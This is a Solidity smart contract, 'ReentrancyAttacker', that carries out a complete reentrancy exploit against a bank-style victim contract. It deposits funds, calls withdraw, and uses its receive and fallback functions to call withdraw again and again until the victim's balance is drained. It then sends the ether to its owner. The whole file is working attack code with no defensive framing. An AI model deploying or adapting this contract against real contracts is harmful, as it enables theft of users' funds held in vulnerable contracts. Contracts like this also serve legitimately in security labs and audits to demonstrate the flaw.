// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IVictimBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    address private immutable owner;
    IVictimBank private immutable victimContract;

    constructor(address _victim) {
        owner = msg.sender;
        victimContract = IVictimBank(_victim);
    }

    function feed() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "No EVM_Cyptro Sent");
        victimContract.deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == owner, "Not owner");
        victimContract.withdraw();
    }

    receive() external payable {
        uint256 targetBalance = address(victimContract).balance;
        if (targetBalance > 0) {
            victimContract.withdraw();
        }
    }

    fallback() external payable {
        uint256 targetBalance = address(victimContract).balance;

        if (targetBalance > 0) {
            victimContract.withdraw();
        }
    }
    
    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
